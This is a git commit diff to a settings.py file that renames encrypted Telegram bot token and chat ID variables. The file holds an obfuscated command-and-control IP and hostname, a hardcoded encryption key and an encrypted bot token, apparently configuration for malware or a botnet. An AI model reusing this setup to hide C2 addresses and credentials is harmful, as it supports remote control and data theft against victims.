ac2ee83f8846aec9b0f2d6d147eefa41cc9b86fe
Linkor512 <98233831+Linkor512@users.noreply.github.com>
2025-09-05 17:41:30 +0400

    Update settings.py

--- settings.py
+++ settings.py
@@ -6,5 +6,5 @@ ENCRYPTION_KEY = "MneStaloPohuyNaBezopasnost"
 # Зашифрованные данные (результат работы encrypt_secrets.py)
 ENC_C2_IP = '\x7f_S}FUBZgAZ@H'
 ENC_C2_HOSTNAME = '.\\H0\x1b\x0f\x18\x1d?\x03E\x05\x18 \x04.HMXGO\x1c\x00\x1d\x16\x1a)\x0b\x17}\x17\x0e\x01'
-ENC_BOT_TOKEN = "zXPcFRTWe_R48\x08'!1*Z\x05\x04\x00 \x162\x06(4\x07\x04A>\x0b#cY\n\x07?\x01\x03/W\x1f\\D"
-ENC_CHAT_ID = '|XQcERTVgW'
+ENC_TELEGRAM_BOT_TOKEN = "zXPcFRTWe_R48\x08'!1*Z\x05\x04\x00 \x162\x06(4\x07\x04A>\x0b#cY\n\x07?\x01\x03/W\x1f\\D"
+ENC_TELEGRAM_CHAT_ID = '|XQcERTVgW'
